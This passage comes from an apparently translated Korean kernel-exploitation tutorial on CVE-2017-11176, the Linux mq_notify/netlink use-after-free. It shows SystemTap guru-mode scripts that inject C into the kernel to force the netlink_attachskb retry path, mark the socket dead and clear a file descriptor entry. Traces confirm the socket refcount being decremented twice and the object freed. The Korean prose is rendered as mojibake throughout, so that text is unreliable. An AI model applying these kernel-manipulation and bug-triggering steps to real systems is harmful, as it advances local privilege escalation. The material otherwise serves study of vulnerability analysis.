(18998-18998) [vfs] <<== fget = ffff88003cf14d80                                // PASSED
(18998-18998) [netlink] ==>> netlink_getsockbyfilp (filp=0xffff88003cf14d80)
(18998-18998) [netlink] <<== netlink_getsockbyfilp = ffff88002ff60000           // PASSED
(18998-18998) [netlink] ==>> netlink_attachskb (sk=0xffff88002ff60000 skb=0xffff88003d1e0480 timeo=0xffff88003df8ff40 ssk=0x0)
(18998-18998) [netlink] <<== netlink_attachskb = 0                              // UNWANTED BEHAVIOR
(18998-18998) [vfs] ==>> fget (fd=0xffffffff)
(18998-18998) [vfs] <<== fget = 0
(18998-18998) [netlink] ==>> netlink_detachskb (sk=0xffff88002ff60000 skb=0xffff88003d1e0480)
(18998-18998) [netlink] <<== netlink_detachskb
(18998-18998) [SYSCALL] <<== mq_notify= -9
```

ì´ëŠ” ì •ë§ *ë²„ê·¸ê°€ ë§ì€* ì²« stap traceì²˜ëŸ¼ ë³´ì¸ë‹¤. ì°¨ì´ì ì€ library ë’¤ì— ìˆ¨ì€ ê²ƒì´ ì•„ë¬´ê²ƒë„ ì—†ê³  ìš°ë¦¬ê°€ *ì‹¤ì œë¡œ* ëª¨ë“  ë°ì´í„°(file descriptor, sigev)ë¥¼ í†µì œí•œë‹¤ëŠ” ê²ƒì´ë‹¤. ì²« **fget()**ë„ **netlink\_getsockbyflip()**ë„ *NULL*ì„ ë°˜í™˜í•˜ì§€ ì•Šì•˜ìœ¼ë¯€ë¡œ ìš°ë¦¬ê°€ ë‘ ê²€ì‚¬ë¥¼ ëª¨ë‘ í†µê³¼í•œ ê±°ë¼ê³  ì•ˆì‹¬í•  ìˆ˜ ìˆê² ë‹¤.

### Forcing netlink\_attachskb() to take the retry path

ì´ì „ ì½”ë“œë¥¼ í†µí•´ (0ì„ ë°˜í™˜í•œ) **netlink\_attachskb()**ì— ë„ë‹¬í–ˆë‹¤. ì´ëŠ” ìš°ë¦¬ê°€ "ì¼ë°˜ì ì¸" ê²½ë¡œë¡œ ë“¤ì–´ê°”ë‹¤ëŠ” ëœ»ì´ë‹¤. ìš°ë¦¬ëŠ” ì¼ë°˜ì ì¸ ê²½ë¡œê°€ ì•„ë‹Œ "retry" pathë¡œ ê°€ê³  ì‹¶ë‹¤. ê·¸ëŸ¼ ë‹¤ì‹œ ì»¤ë„ ì½”ë“œë¡œ ëŒì•„ê°€ë³´ì:

```c
    int netlink_attachskb(struct sock *sk, struct sk_buff *skb,
              long *timeo, struct sock *ssk)
    {
      struct netlink_sock *nlk;

      nlk = nlk_sk(sk);

[0]   if (atomic_read(&sk->sk_rmem_alloc) > sk->sk_rcvbuf || test_bit(0, &nlk->state)) {
        DECLARE_WAITQUEUE(wait, current);
        if (!*timeo) {
          // ... cut (never reached in our code path) ...
        }

        __set_current_state(TASK_INTERRUPTIBLE);
        add_wait_queue(&nlk->wait, &wait);

        if ((atomic_read(&sk->sk_rmem_alloc) > sk->sk_rcvbuf || test_bit(0, &nlk->state)) &&
            !sock_flag(sk, SOCK_DEAD))
          *timeo = schedule_timeout(*timeo);

        __set_current_state(TASK_RUNNING);
        remove_wait_queue(&nlk->wait, &wait);
        sock_put(sk);

        if (signal_pending(current)) {
          kfree_skb(skb);
          return sock_intr_errno(*timeo);
        }
        return 1;                             // <---- the only way
      }
      skb_set_owner_r(skb, sk);
      return 0;
    }
```

*netlink\_attachskb()* ê°€ "1"ì„ ë°˜í™˜í•˜ê²Œ í•˜ëŠ” **ìœ ì¼í•œ ê¸¸**ë¡œ ê°€ê¸° ìœ„í•´ì„  ë¨¼ì € ê²€ì‚¬ë¥¼ í†µê³¼í•´ì•¼ í•œë‹¤ [0].

```c
    if (atomic_read(&sk->sk_rmem_alloc) > sk->sk_rcvbuf || test_bit(0, &nlk->state))
```

ì´ì œ System Tapì˜ *ì§„ì •í•œ í˜* ì„ ê°œë°©í•  ë•Œê°€ ëë‹¤. **Guru Mode**ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ë‹¤! Guru ModeëŠ” ìš°ë¦¬ê°€ "C" ì½”ë“œë¥¼ ì‘ì„±í•˜ë©´ ê·¸ê±¸ probeì—ì„œ í˜¸ì¶œí•  ìˆ˜ ìˆë„ë¡ í•´ì¤€ë‹¤. ë§ˆì¹˜ Linux Kernel Module (LKM)ì²˜ëŸ¼ ëŸ°íƒ€ì„ì— ì£¼ì…ë˜ëŠ”(injected) ì»¤ë„ì½”ë“œë¥¼ ì§ì ‘ ì“°ëŠ” ê²ƒê³¼ ê°™ë‹¤. ì´ë•Œë¬¸ì— ì—¬ê¸°ì„œ ë¬´ìŠ¨ í”„ë¡œê·¸ë˜ë° ì—ëŸ¬ê°€ ë°œìƒí•˜ë©´ ì»¤ë„ í¬ë˜ì‹œê°€ ë°œìƒí•œë‹¤! ì´ì œ ì»¤ë„ ê°œë°œìê°€ ëœ ê²ƒì´ë‹¤ğŸ˜.

ì´ì œ ì—¬ê¸°ì„œ ìš°ë¦° *struct sock* (sk) ê·¸ë¦¬ê³ /í˜¹ì€ *struct netlink\_sock* (nlk) ë°ì´í„° êµ¬ì¡°ë¥¼ ë³€í˜•í•˜ì—¬ ì¡°ê±´ì„ ë§Œì¡±ì‹œí‚¬ ê²ƒì´ë‹¤. ê·¸ì „ì— í˜„ì¬ *struct sock* **sk**ì˜ ìƒíƒœ ì •ë³´ë¥¼ ì–»ì–´ë³´ì.

*netlink\_attachskb()* probeë¥¼ ìˆ˜ì •í•˜ì—¬ C ì½”ë“œë¥¼ ì¡°ê¸ˆ "ë‚´ì¥ì‹œì¼œ"(embed) ë³´ì("%{" and "%}" ë¶€ë¶„).

```c
    %{
    #include <net/sock.h>
    #include <net/netlink_sock.h>
    %}

    function dump_netlink_sock:long (arg_sock:long)
    %{
      struct sock *sk = (void*) STAP_ARG_arg_sock;
      struct netlink_sock *nlk = (void*) sk;

      _stp_printf("-={ dump_netlink_sock: %p }=-\n", nlk);
      _stp_printf("- sk = %p\n", sk);
      _stp_printf("- sk->sk_rmem_alloc = %d\n", sk->sk_rmem_alloc);
      _stp_printf("- sk->sk_rcvbuf = %d\n", sk->sk_rcvbuf);
      _stp_printf("- sk->sk_refcnt = %d\n", sk->sk_refcnt);

      _stp_printf("- nlk->state = %x\n", (nlk->state & 0x1));

      _stp_printf("-={ dump_netlink_sock: END}=-\n");
    %}

    probe kernel.function ("netlink_attachskb")
    {
      if (execname() == "exploit")
      {
        printf("(%d-%d) [netlink] ==>> netlink_attachskb (%s)\n", pid(), tid(), $$parms)

        dump_netlink_sock($sk);
      }
    }
```

**ì£¼ì˜**: ë‹¤ì‹œ, ìœ„ ì½”ë“œëŠ” ì»¤ë„ ì˜ì—­ì—ì„œ ì‹¤í–‰ë˜ë¯€ë¡œ ì—ëŸ¬ê°€ ë‚˜ë©´ ì»¤ë„ í¬ë˜ì‹œê°€ ë°œìƒí•œë‹¤.

system tapì„ **-g**(= guru) ì˜µì…˜ì„ ì¤˜ì„œ ì‹¤í–‰í•˜ì:

```plaintext
-={ CVE-2017-11176 Exploit }=-
netlink socket created = 3
mq_notify: Bad file descriptor
exploit failed!

(19681-19681) [SYSCALL] ==>> mq_notify (-1, 0x7ffebaa7e720)
(19681-19681) [uland] ==>> copy_from_user ()
(19681-19681) [skb] ==>> alloc_skb (priority=0xd0 size=0x20)
(19681-19681) [uland] ==>> copy_from_user ()
(19681-19681) [skb] ==>> skb_put (skb=0xffff88003d1e05c0 len=0x20)
(19681-19681) [skb] <<== skb_put = ffff88000a0a2200
(19681-19681) [vfs] ==>> fget (fd=0x3)
(19681-19681) [vfs] <<== fget = ffff88003d0d5680
(19681-19681) [netlink] ==>> netlink_getsockbyfilp (filp=0xffff88003d0d5680)
(19681-19681) [netlink] <<== netlink_getsockbyfilp = ffff880036256800
(19681-19681) [netlink] ==>> netlink_attachskb (sk=0xffff880036256800 skb=0xffff88003d1e05c0 timeo=0xffff88003df5bf40 ssk=0x0)

-={ dump_netlink_sock: 0xffff880036256800 }=-
- sk = 0xffff880036256800
- sk->sk_rmem_alloc = 0         // <-----
- sk->sk_rcvbuf = 133120        // <-----
- sk->sk_refcnt = 2
- nlk->state = 0                // <-----
-={ dump_netlink_sock: END}=-

(19681-19681) [netlink] <<== netlink_attachskb = 0
(19681-19681) [vfs] ==>> fget (fd=0xffffffff)
(19681-19681) [vfs] <<== fget = 0
(19681-19681) [netlink] ==>> netlink_detachskb (sk=0xffff880036256800 skb=0xffff88003d1e05c0)
(19681-19681) [netlink] <<== netlink_detachskb
(19681-19681) [SYSCALL] <<== mq_notify= -9
```

ë‚´ì¥ëœ stap í•¨ìˆ˜ì¸ **dump\_netlink\_sock()**ì´ ì„±ê³µì ìœ¼ë¡œ *netlink\_attachskb()* ì— ì§„ì…í•˜ê¸° ì „ì— í˜¸ì¶œë˜ì—ˆë‹¤. ë³¼ ìˆ˜ ìˆë“¯ì´ *state* ì˜ ì²« ë¹„íŠ¸ëŠ” ì„¤ì •ë˜ì–´ ìˆì§€ ì•Šê³ , *sk\_rmem\_alloc* ì´ *sk\_rcvbuf* ë³´ë‹¤ ì‘ë‹¤. ë”°ë¼ì„œ ê²€ì‚¬ë¥¼ í†µê³¼í•˜ì§€ ëª»í•œë‹¤.

*nlk->state* ë¥¼ *netlink\_attachskb()* í˜¸ì¶œ ì „ì— ìˆ˜ì •í•´ë³´ì:

```c
    function dump_netlink_sock:long (arg_sock:long)
    %{
      struct sock *sk = (void*) STAP_ARG_arg_sock;
      struct netlink_sock *nlk = (void*) sk;

      _stp_printf("-={ dump_netlink_sock: %p }=-\n", nlk);
      _stp_printf("- sk = %p\n", sk);
      _stp_printf("- sk->sk_rmem_alloc = %d\n", sk->sk_rmem_alloc);
      _stp_printf("- sk->sk_rcvbuf = %d\n", sk->sk_rcvbuf);
      _stp_printf("- sk->sk_refcnt = %d\n", sk->sk_refcnt);

      _stp_printf("- (before) nlk->state = %x\n", (nlk->state & 0x1));
      nlk->state |= 1;                                                  // <-----
      _stp_printf("- (after) nlk->state = %x\n", (nlk->state & 0x1));

      _stp_printf("-={ dump_netlink_sock: END}=-\n");
    %}
```

ê·¸ë¦¬ê³  ì‹¤í–‰í•´ë³´ì:

```plaintext
-={ CVE-2017-11176 Exploit }=-
netlink socket created = 3

<<< HIT CTRL-C HERE >>>

^Cmake: *** [check] Interrupt


(20002-20002) [SYSCALL] ==>> mq_notify (-1, 0x7ffc48bed2c0)
(20002-20002) [uland] ==>> copy_from_user ()
(20002-20002) [skb] ==>> alloc_skb (priority=0xd0 size=0x20)
(20002-20002) [uland] ==>> copy_from_user ()
(20002-20002) [skb] ==>> skb_put (skb=0xffff88003d3a6080 len=0x20)
(20002-20002) [skb] <<== skb_put = ffff88002e142600
(20002-20002) [vfs] ==>> fget (fd=0x3)
(20002-20002) [vfs] <<== fget = ffff88003ddd8380
(20002-20002) [netlink] ==>> netlink_getsockbyfilp (filp=0xffff88003ddd8380)
(20002-20002) [netlink] <<== netlink_getsockbyfilp = ffff88003dde0400
(20002-20002) [netlink] ==>> netlink_attachskb (sk=0xffff88003dde0400 skb=0xffff88003d3a6080 timeo=0xffff88002e233f40 ssk=0x0)

-={ dump_netlink_sock: 0xffff88003dde0400 }=-
- sk = 0xffff88003dde0400
- sk->sk_rmem_alloc = 0
- sk->sk_rcvbuf = 133120
- sk->sk_refcnt = 2
- (before) nlk->state = 0
- (after)  nlk->state = 1
-={ dump_netlink_sock: END}=-

<<< HIT CTRL-C HERE >>>

(20002-20002) [netlink] <<== netlink_attachskb = fffffffffffffe00   // <-----
(20002-20002) [SYSCALL] <<== mq_notify= -512
```

ì•—...ì•„ì•„... *mq\_notify()* ì— ëŒ€í•œ í˜¸ì¶œì´ **ë§‰í˜”ë‹¤**(= main exploit threadê°€ syscall ì•ˆì—ì„œ ì»¤ë„ ì˜ì—­ì— ê°‡í˜). ë‹¤í–‰íˆ *CTRL-C* ë¥¼ ëˆ„ë¥´ë©´ ë‹¤ì‹œ ì¡°ì‘í•  ìˆ˜ ìˆë‹¤.

ì´ë²ˆì—” **netlink\_attachskb()**ê°€ **0xfffffffffffffe00**ë¥¼ ë°˜í™˜í–ˆë‹¤ëŠ” ì ì— ì£¼ëª©í•´ë³´ì. ì´ëŠ” "-ERESTARTSYS"ì˜ ì—ëŸ¬ ë²ˆí˜¸ë‹¤. ì¦‰ ìš°ë¦¬ëŠ” ì´ pathë¡œ ë“¤ì–´ì˜¨ ê²ƒì´ë‹¤:

```c
        if (signal_pending(current)) {
            kfree_skb(skb);
            return sock_intr_errno(*timeo); // <---- return -ERESTARTSYS
        }
```

ì´ëŠ” ìš°ë¦¬ê°€ *netlink\_attachskb()* ì˜ ë‹¤ë¥¸ pathì— ë„ë‹¬í–ˆìŒì„ ì˜ë¯¸í•œë‹¤. ì„ë¬´ ì„±ê³µì´ë‹¤!

### Avoid being blocked

*mq\_notify()* ê°€ ë§‰íŒ ì´ìœ ëŠ” ì´ê²ƒì´ë‹¤:

```c
        __set_current_state(TASK_INTERRUPTIBLE);

        if ((atomic_read(&sk->sk_rmem_alloc) > sk->sk_rcvbuf || test_bit(0, &nlk->state)) &&
            !sock_flag(sk, SOCK_DEAD))
            *timeo = schedule_timeout(*timeo);

        __set_current_state(TASK_RUNNING);
```

*scheduling* ì— ëŒ€í•´ì„œëŠ” ë‚˜ì¤‘ì— ë” ìì„¸íˆ ë‹¤ë£¨ë„ë¡ í•˜ê³ (part 2 ì°¸ê³ ), ì§€ê¸ˆì€ ìš°ë¦¬ì˜ taskê°€ *íŠ¹ìˆ˜í•œ ì¡°ê±´* ì„ ë§Œì¡±í•  ë•Œê¹Œì§€ **ë©ˆì¶°ìˆë‹¤**ëŠ” ê²ƒë§Œ ê³ ë ¤í•´ë³´ì (wait queueì— ëŒ€í•œ ê²ƒì´ë‹¤).

scheduleë˜ê±°ë‚˜ blockë˜ëŠ” ê²ƒì„ í”¼í•  ìˆ˜ ìˆì„ê¹Œ? ê·¸ë ‡ê²Œ í•˜ê¸° ìœ„í•´ì„  **schedule\_timeout()**ì— ëŒ€í•œ í˜¸ì¶œì„ ìš°íšŒí•´ì•¼ í•œë‹¤. sockì„ "SOCK\_DEAD"ë¼ê³  markí•´ë³´ì (ì¡°ê±´ì˜ ë§ˆì§€ë§‰ ë¶€ë¶„). ì¦‰ (ì „ì— í–ˆë˜ ê²ƒì²˜ëŸ¼) "sk"ì˜ ë‚´ìš©ì„ ë°”ê¿” ë‹¤ìŒì˜ **sock\_flag()** í•¨ìˆ˜ê°€ trueë¥¼ ë°˜í™˜í•˜ë„ë¡ í•˜ëŠ” ê²ƒì´ë‹¤:

```c
    // from [include/net/sock.h]
    static inline bool sock_flag(const struct sock *sk, enum sock_flags flag)
    {
      return test_bit(flag, &sk->sk_flags);
    }

    enum sock_flags {
      SOCK_DEAD,      // <---- this has to be '0', but we can check it with stap!
      ... cut ...
    }
```

probeë¥¼ ë‹¤ì‹œ ìˆ˜ì •í•´ë³´ì:

```c
  // mark it congested!
  _stp_printf("- (before) nlk->state = %x\n", (nlk->state & 0x1));
  nlk->state |= 1;            
  _stp_printf("- (after) nlk->state = %x\n", (nlk->state & 0x1));

  // mark it DEAD
  _stp_printf("- sk->sk_flags = %x\n", sk->sk_flags);
  _stp_printf("- SOCK_DEAD = %x\n", SOCK_DEAD);
  sk->sk_flags |= (1 << SOCK_DEAD);
  _stp_printf("- sk->sk_flags = %x\n", sk->sk_flags);
```

ë‹¤ì‹œ ì‹¤í–‰ì„ í•´ë³´ë©´...ì§œì”! ìµìŠ¤í”Œë¡œì‡ì´ ì´ì   ì»¤ë„ ì•ˆì—ì„œ ë¬´í•œ ë£¨í”„ì— ê°‡í˜”ë‹¤. ì´ìœ ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤:

* *netlink\_attachskb()*ì— ì§„ì…í•˜ê³  retry pathë¥¼ ì‚¬ìš©í•œë‹¤ (ìš°ë¦¬ê°€ ê°•ì œí–ˆë‹¤)
* ìŠ¤ë ˆë“œê°€ scheduleë˜ì§€ ì•ŠëŠ”ë‹¤ (ìš°íšŒí–ˆë‹¤)
* *netlink\_attachskb()* ê°€ 1ì„ ë°˜í™˜í•œë‹¤
* *mq\_notify()* ë¡œ ëŒì•„ê°€ì„œ "goto retry" êµ¬ë¬¸ì´ ì‹¤í–‰ëœë‹¤
* *fget()* ì´ nullì´ ì•„ë‹Œ ê°’ì„ ë°˜í™˜í•œë‹¤
* *netlink\_getsockbyflip()*ë„ nullì´ ì•„ë‹Œ ê°’ì„ ë°˜í™˜í•œë‹¤
* ë‹¤ì‹œ *netlink\_attachskb()* ì— ì§„ì…í•œë‹¤
* ...ë¬´í•œ ë°˜ë³µ...

ìš°ë¦´ blockí•œ *schedule\_timeout()* ìœ¼ë¡œì˜ í˜¸ì¶œì€ ì˜ ìš°íšŒí–ˆì§€ë§Œ, ê·¸ ê³¼ì •ì—ì„œ ë¬´í•œ ë£¨í”„ê°€ ìƒê²¼ë‹¤.

### Stopping the infinite loop

í•´í‚¹ì„ ê³„ì† ì§„í–‰í•˜ì—¬ *fget()* ì´ ë‘ ë²ˆì§¸ í˜¸ì¶œì—ì„œ ì‹¤íŒ¨í•˜ê²Œ í•´ë³´ì! FDTì—ì„œ file descriptorë¥¼ ì§ì ‘ì ìœ¼ë¡œ ì œê±°í•˜ëŠ” ê²ƒì´ í•œ ë°©ë²•ì´ë‹¤(= NULLë¡œ ë§Œë“ ë‹¤):

```c
    %{
    #include <linux/fdtable.h>
    %}

    function remove_fd3_from_fdt:long (arg_unused:long)
    %{
        _stp_printf("!!>>> REMOVING FD=3 FROM FDT <<<!!\n");
        struct files_struct *files = current->files;
        struct fdtable *fdt = files_fdtable(files);
        fdt->fd[3] = NULL;
    %}

    probe kernel.function ("netlink_attachskb")
    {
      if (execname() == "exploit")
      {
        printf("(%d-%d) [netlink] ==>> netlink_attachskb (%s)\n", pid(), tid(), $$parms)

        dump_netlink_sock($sk); // it also marks the socket as DEAD and CONGESTED
        remove_fd3_from_fdt(0);
      }
    }
```

```plaintext
-={ CVE-2017-11176 Exploit }=-
netlink socket created = 3
mq_notify: Bad file descriptor
exploit failed!

(3095-3095) [SYSCALL] ==>> mq_notify (-1, 0x7ffe5e528760)
(3095-3095) [uland] ==>> copy_from_user ()
(3095-3095) [skb] ==>> alloc_skb (priority=0xd0 size=0x20)
(3095-3095) [uland] ==>> copy_from_user ()
(3095-3095) [skb] ==>> skb_put (skb=0xffff88003f02cd00 len=0x20)
(3095-3095) [skb] <<== skb_put = ffff88003144ac00
(3095-3095) [vfs] ==>> fget (fd=0x3)
(3095-3095) [vfs] <<== fget = ffff880031475480
(3095-3095) [netlink] ==>> netlink_getsockbyfilp (filp=0xffff880031475480)
(3095-3095) [netlink] <<== netlink_getsockbyfilp = ffff88003cf56800
(3095-3095) [netlink] ==>> netlink_attachskb (sk=0xffff88003cf56800 skb=0xffff88003f02cd00 timeo=0xffff88002d79ff40 ssk=0x0)
-={ dump_netlink_sock: 0xffff88003cf56800 }=-
- sk = 0xffff88003cf56800
- sk->sk_rmem_alloc = 0
- sk->sk_rcvbuf = 133120
- sk->sk_refcnt = 2
- (before) nlk->state = 0
- (after) nlk->state = 1
- sk->sk_flags = 100
- SOCK_DEAD = 0
- sk->sk_flags = 101
-={ dump_netlink_sock: END}=-
!!>>> REMOVING FD=3 FROM FDT <<<!!
(3095-3095) [netlink] <<== netlink_attachskb = 1        // <-----
(3095-3095) [vfs] ==>> fget (fd=0x3)
(3095-3095) [vfs] <<== fget = 0                         // <-----
(3095-3095) [netlink] ==>> netlink_detachskb (sk=0xffff88003cf56800 skb=0xffff88003f02cd00)
(3095-3095) [netlink] <<== netlink_detachskb
(3095-3095) [SYSCALL] <<== mq_notify= -9
```

ìš°ë¦¬ê°€ ì†Œê°œí•œ ëŒ€ë¡œ ì»¤ë„ì´ ë¬´í•œë£¨í”„ë¥¼ ì˜ íƒˆì¶œí–ˆë‹¤. ê²Œë‹¤ê°€ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ì— ì ì  ê°€ê¹Œì›Œì§€ê³  ìˆë‹¤:

1. *netlink\_attachskb()*ê°€ 1ì„ ë°˜í™˜
2. *fget()*ì— ëŒ€í•œ ë‘ ë²ˆì§¸ í˜¸ì¶œì´ NULLì„ ë°˜í™˜

ê·¸ëŸ¼ ìš°ë¦¬ê°€ ë²„ê·¸ë¥¼ íŠ¸ë¦¬ê±°í•œ ê²ƒì¸ê°€?

### Checking the refcounter status

ëª¨ë“  ê²ƒì´ ê³„íšëŒ€ë¡œ ëìœ¼ë¯€ë¡œ ë²„ê·¸ê°€ íŠ¸ë¦¬ê±°ë˜ê³  *sock* ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ê°€ ë‘ ë²ˆ ê°ì†Œí•´ì•¼ í•œë‹¤. ì²´í¬í•´ë³´ì.

*exit probe*ì—ì„œ *enter probe*ì˜ íŒŒë¼ë¯¸í„°ë¥¼ ê°€ì ¸ì˜¬ ìˆœ ì—†ë‹¤. ì´ëŠ” *netlink\_attachskb()*ì—ì„œ ë¦¬í„´í•˜ëŠ” ë„ì¤‘ì— *sock*ì˜ ë‚´ìš©ì„ ë³¼ ìˆ˜ ì—†ë‹¤ëŠ” ëœ»ì´ë‹¤.

í•œ ë°©ë²•ì€ *netlink\_getsockbyflip()* ì´ ë°˜í™˜í•˜ëŠ” *sock* í¬ì¸í„°ë¥¼ ì „ì—­ ë³€ìˆ˜(ìŠ¤í¬ë¦½íŠ¸ì˜ *sock\_ptr*)ë¡œ ì €ì¥í•˜ëŠ” ê²ƒì´ë‹¤. ê·¸ë¦¬ê³  ë‚´ì¥ "C" ì½”ë“œì˜ *dump\_netlink\_sock()* ìœ¼ë¡œ ë‚´ìš©ì„ ë¤í”„í•˜ëŠ” ê²ƒì´ë‹¤:

```c
    global sock_ptr = 0;                  // <------ declared globally!

    probe syscall.mq_notify.return
    {
      if (execname() == "exploit")
      {
        if (sock_ptr != 0)                // <----- watch your NULL-deref, this is kernel-land!
        {
          dump_netlink_sock(sock_ptr);
          sock_ptr = 0;
        }

        printf("(%d-%d) [SYSCALL] <<== mq_notify= %d\n\n", pid(), tid(), $return)
      }
    }

    probe kernel.function ("netlink_getsockbyfilp").return
    {
      if (execname() == "exploit")
      {
        printf("(%d-%d) [netlink] <<== netlink_getsockbyfilp = %x\n", pid(), tid(), $return)
        sock_ptr = $return;                 // <----- store it
      }
    }
```

ë‹¤ì‹œ ì‹¤í–‰í•´ë³´ì!

```plaintext
(3391-3391) [SYSCALL] ==>> mq_notify (-1, 0x7ffe8f78c840)
(3391-3391) [uland] ==>> copy_from_user ()
(3391-3391) [skb] ==>> alloc_skb (priority=0xd0 size=0x20)
(3391-3391) [uland] ==>> copy_from_user ()
(3391-3391) [skb] ==>> skb_put (skb=0xffff88003d20cd00 len=0x20)
(3391-3391) [skb] <<== skb_put = ffff88003df9dc00
(3391-3391) [vfs] ==>> fget (fd=0x3)
(3391-3391) [vfs] <<== fget = ffff88003d84ed80
(3391-3391) [netlink] ==>> netlink_getsockbyfilp (filp=0xffff88003d84ed80)
(3391-3391) [netlink] <<== netlink_getsockbyfilp = ffff88002d72d800
(3391-3391) [netlink] ==>> netlink_attachskb (sk=0xffff88002d72d800 skb=0xffff88003d20cd00 timeo=0xffff8800317a7f40 ssk=0x0)
-={ dump_netlink_sock: 0xffff88002d72d800 }=-
- sk = 0xffff88002d72d800
- sk->sk_rmem_alloc = 0
- sk->sk_rcvbuf = 133120
- sk->sk_refcnt = 2               // <------------
- (before) nlk->state = 0
- (after) nlk->state = 1
- sk->sk_flags = 100
- SOCK_DEAD = 0
- sk->sk_flags = 101
-={ dump_netlink_sock: END}=-
!!>>> REMOVING FD=3 FROM FDT <<<!!
(3391-3391) [netlink] <<== netlink_attachskb = 1
(3391-3391) [vfs] ==>> fget (fd=0x3)
(3391-3391) [vfs] <<== fget = 0
(3391-3391) [netlink] ==>> netlink_detachskb (sk=0xffff88002d72d800 skb=0xffff88003d20cd00)
(3391-3391) [netlink] <<== netlink_detachskb
-={ dump_netlink_sock: 0xffff88002d72d800 }=-
- sk = 0xffff88002d72d800
- sk->sk_rmem_alloc = 0
- sk->sk_rcvbuf = 133120
- sk->sk_refcnt = 0               // <-------------
- (before) nlk->state = 1
- (after) nlk->state = 1
- sk->sk_flags = 101
- SOCK_DEAD = 0
- sk->sk_flags = 101
-={ dump_netlink_sock: END}=-
(3391-3391) [SYSCALL] <<== mq_notify= -9
```

ë³¼ ìˆ˜ ìˆë“¯ì´ *sk->sk\_refcnt*ê°€ ë‘ ë²ˆ ê°ì†Œí–ˆë‹¤! ì„±ê³µì ìœ¼ë¡œ ë²„ê·¸ë¥¼ íŠ¸ë¦¬ê±°í–ˆë‹¤.

*sock* ì˜ ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ê°€ 0ì´ ë˜ëŠ” ê²ƒì€ *struct netlink\_sock* ì˜¤ë¸Œì íŠ¸ê°€ freeë¨ì„ ì˜ë¯¸í•œë‹¤. ë‹¤ë¥¸ probeë¥¼ ë” ì¶”ê°€í•´ë³´ì:

```plaintext
... cut ...

(13560-13560) [netlink] <<== netlink_attachskb = 1
(13560-13560) [vfs] ==>> fget (fd=0x3)
(13560-13560) [vfs] <<== fget = 0
(13560-13560) [netlink] ==>> netlink_detachskb (sk=0xffff88002d7e5c00 skb=0xffff88003d2c1440)
(13560-13560) [kmem] ==>> kfree (objp=0xffff880033fd0000)
(13560-13560) [kmem] <<== kfree = 
(13560-13560) [sk] ==>> sk_free (sk=0xffff88002d7e5c00)
(13560-13560) [sk] ==>> __sk_free (sk=0xffff88002d7e5c00)
(13560-13560) [kmem] ==>> kfree (objp=0xffff88002d7e5c00) // <---- freeing "sock"
(13560-13560) [kmem] <<== kfree = 
(13560-13560) [sk] <<== __sk_free = 
(13560-13560) [sk] <<== sk_free = 
(13560-13560) [netlink] <<== netlink_detachskb
```

sock ì˜¤ë¸Œì íŠ¸ê°€ freeë˜ê¸´ í•˜ëŠ”ë° *use-after-free*ê°€ ë³´ì´ì§„ ì•ŠëŠ”ë‹¤...

### Why it did not crash?

ì›ë˜ ê³„íšê³¼ëŠ” ë‹¤ë¥´ê²Œ *netlink\_sock* ì˜¤ë¸Œì íŠ¸ê°€ *netlink\_detachskb()*ì— ì˜í•´ freeë˜ì—ˆë‹¤.ì´ìœ ëŠ” ***close()* ë¥¼ í˜¸ì¶œí•˜ì§€ ì•Šì•˜ê¸°** ë•Œë¬¸ì´ë‹¤(FDT í•­ëª©ë§Œ NULLë¡œ ë¦¬ì…‹í•´ì£¼ì—ˆë‹¤). ì¦‰ file ì˜¤ë¸Œì íŠ¸ê°€ releaseë˜ì§€ ì•Šì•˜ê³ , *netlink\_sock* ì˜¤ë¸Œì íŠ¸ì— ëŒ€í•œ ì°¸ì¡°ë¥¼ í•´ì œí•˜ì§€ ì•Šì€ ê²ƒì´ë‹¤. ë‹¤ì‹œ ë§í•´ ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ê°€ ê°ì†Œí•˜ì§€ ì•Šì•˜ë‹¤.

ê·¸ëŸ¬ë‚˜ ìš°ë¦¬ì˜ ëª©ì ì€ ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ê°€ ë‘ ë²ˆ(*netlink\_attachskb()* ì— ì˜í•´ì„œ í•œ ë²ˆ, *netlink\_detachskb()* ì— ì˜í•´ì„œ í•œ ë²ˆ) ê°ì†Œí•œë‹¤ëŠ” ê²ƒì„ ê²€ì¦í•˜ëŠ” ê²ƒì´ì—ˆê¸° ë•Œë¬¸ì— ë³„ ë¬¸ì œê°€ ë˜ì§„ ì•ŠëŠ”ë‹¤. ì¼ë°˜ì ì¸ íë¦„ëŒ€ë¡œ operation(= *close()*)ì´ ì§„í–‰ëœë‹¤ë©´ ì´ ì¶”ê°€ì ì¸ ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ì˜ ê°ì†Œê°€ ë°œìƒí•˜ì—¬ *netlink\_detachskb()*ê°€ UAFë¥¼ í•  ê²ƒì´ë‹¤. ìš°ë¦° ì‹¬ì§€ì–´ ìƒí™©ì„ ë” ì˜ ì œì–´í•˜ê¸° ìœ„í•´ ì´ use-after-freeë¥¼ "delay"í•  ê²ƒì´ë‹¤(part 2 ì°¸ê³ ).

### The final System Tap script

ë§ˆì§€ë§‰ìœ¼ë¡œ, ë²„ê·¸ë¥¼ íŠ¸ë¦¬ê±°í•˜ëŠ” system tap ìŠ¤í¬ë¦½íŠ¸ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ê°„ë‹¨í•´ì§„ë‹¤:

```c
# mq_notify_force_crash.stp
#
# Run it with "stap -v -g ./mq_notify_force_crash.stp" (guru mode)

%{
#include <net/sock.h>
#include <net/netlink_sock.h>
#include <linux/fdtable.h>
%}

function force_trigger:long (arg_sock:long)
%{
  struct sock *sk = (void*) STAP_ARG_arg_sock;
  sk->sk_flags |= (1 << SOCK_DEAD); // avoid blocking the thread

  struct netlink_sock *nlk = (void*) sk;
  nlk->state |= 1;   // enter the netlink_attachskb() retry path    

  struct files_struct *files = current->files;
  struct fdtable *fdt = files_fdtable(files);
  fdt->fd[3] = NULL; // makes the second call to fget() fails
%}

probe kernel.function ("netlink_attachskb")
{
  if (execname() == "exploit")
  {
    force_trigger($sk);
  }
}
```

ì°¸ ì‰½ì£ ?

- - -

## <a name='conclusion'></a>ê²°ë¡ 

